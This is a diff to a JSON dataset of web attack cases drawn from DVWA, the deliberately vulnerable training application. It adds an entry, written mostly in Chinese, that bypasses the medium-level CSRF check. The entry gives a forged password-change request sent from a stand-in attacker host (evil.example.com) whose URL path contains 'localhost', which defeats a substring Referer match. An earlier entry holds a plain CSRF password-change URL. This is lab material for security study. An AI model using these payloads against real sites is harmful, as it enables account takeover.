@@ -5,5 +5,12 @@
     "reference_payload": "http://localhost:8081/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change",
     "principle": "No anti-CSRF token + GET state-changing request: cross-site forgery works with victim cookie only",
     "source": "dvwa"
+  },
+  {
+    "id": "auto-20261030133021",
+    "context": "DVWA CSRF medium：改密接口 GET /vulnerabilities/csrf/?password_new=X&password_conf=X&Change=Change，无任何 CSRF token。medium 仅校验 Referer：stripos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME'])（source/medium.php line 5），SERVER_NAME=localhost。直接无 Referer 访问返回 'That request didn't look correct.'；用包含 'localhost' 的跨源 Referer 即绕过，密码被改成 evilpass1 并成功登录验证。",
+    "reference_payload": "GET /vulnerabilities/csrf/?password_new=evilpass1&password_conf=evilpass1&Change=Change  Referer: http://evil.example.com/localhost/csrf.html  (Cookie: PHPSESSID=...; security=medium)",
+    "principle": "无 token，唯一防护是 Referer 子串匹配 SERVER_NAME；攻击者页面 URL 路径含 'localhost'（如 http://evil.example.com/localhost/csrf.html）使 Referer 命中 stripos 即绕过，实现跨站改密",
+    "source": "dvwa"
   }
 ]
